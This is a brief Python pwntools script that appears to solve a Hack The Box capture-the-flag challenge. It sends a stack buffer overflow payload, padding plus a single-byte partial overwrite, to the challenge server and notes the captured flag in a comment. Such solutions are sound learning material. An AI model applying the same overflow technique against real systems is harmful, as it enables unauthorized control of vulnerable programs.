from pwn import *

def main():
    LOCAL = False
    if LOCAL:
        r = process('./sp_going_deeper')
    else: 
        r = remote('206.189.28.151',30583)

    r.recvuntil(">> ")
    payload = b'A' * 0x38 + b'\x12'
    r.sendline('1')
    r.recvuntil(": ")
    r.sendline(payload)
    r.interactive() 
    

    f = open('./payload', 'wb')
    f.write(b'1\n' + payload) 
    f.close()

if __name__ == '__main__':
    main()
    # flag: HTB{d1g_1n51d3..u_Cry_cry_cry}
